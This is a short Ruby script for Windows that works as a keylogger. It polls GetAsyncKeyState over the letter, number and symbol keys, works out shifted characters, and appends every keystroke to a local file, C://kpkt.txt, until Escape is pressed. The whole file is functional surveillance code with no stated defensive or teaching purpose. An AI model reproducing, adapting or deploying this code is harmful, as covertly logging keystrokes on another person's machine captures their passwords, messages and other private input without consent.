require 'Win32API'

VK_SHIFT = 0x10
VK_ESC = 0x1B

def check_shifts()
	$listener.call(VK_SHIFT) != 0 ? true : false
end

# create empty Hash of key codes
keys = Hash.new

# create empty Hash for shift characters
uppercase = Hash.new

# add letters
(0x41..0x5A).each { |code| keys[code.chr.downcase] = code }

# add numbers
(0x30..0x39).each { |code| keys[code-0x30] = code }

# add special characters
keys[';'] = 0xBA; keys['='] = 0xBB; keys[','] = 0xBC; keys['-'] = 0xBD; keys['.'] = 0xBE 
keys['/'] = 0xBF; keys['`'] = 0xC0; keys['['] = 0xDB; keys[']'] = 0xDD; keys["'"] = 0xDE 
keys['\\'] = 0xDC

# add custom key macros
keys["\n"] = 0x0D; keys["\t"] = 0x09; keys['(backspace)'] = 0x08; keys['(CAPSLOCK)'] = 0x14

# add for uppercase letters
('a'..'z').each { |char| uppercase[char] = char.upcase }

# add for uppercase numbers
uppercase[1] = '!'; uppercase[2] = '@'; uppercase[3] = '#'; uppercase[4] = '$'; uppercase[5] = '%'
uppercase[6] = '^'; uppercase[7] = '&'; uppercase[8] = '*'; uppercase[9] = '('; uppercase[0] = ')'

# add for uppercase special characters
uppercase[';'] = ':'; uppercase['='] = '+'; uppercase[','] = '<'; uppercase['-'] = '_'; uppercase['.'] = '>'
uppercase['/'] = '?'; uppercase['`'] = '~'; uppercase['['] = '{'; uppercase[']'] = '}'; uppercase["'"] = '"'
uppercase['\\'] = '|'

# create a listener for Windows key-presses
$listener = Win32API.new('user32', 'GetAsyncKeyState', ['i'], 'i')

# call listener once to initialize lsb's
keys.each_value { |code| $listener.call(code) }

logs = File.open('C://kpkt.txt', 'a')

while true
	break if $listener.call(VK_ESC) != 0

	keys.each do |char, code|
		n = $listener.call(code)
		if n and n & 0x01 == 1
			check_shifts() ? logs.write("#{uppercase[char]}") : logs.write("#{char}")
		end
	end
end

logs.close()